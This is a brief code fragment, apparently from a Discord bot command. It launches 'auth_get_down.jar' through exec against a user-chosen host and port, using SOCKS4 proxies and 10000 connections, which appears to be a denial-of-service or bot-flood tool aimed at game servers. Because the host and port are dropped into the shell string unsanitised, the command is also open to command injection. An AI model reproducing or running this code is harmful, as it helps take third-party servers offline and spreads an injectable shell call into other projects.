...
module.exports = {
  ...
  run: async ({client, message, args, MessageEmbed}) => {
    ...
    exec(`screen timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar auth_get_down.jar ${host}:${port} 10000 0 auth socks4_proxies.txt`, (error, stdout, stderr) => {
    });
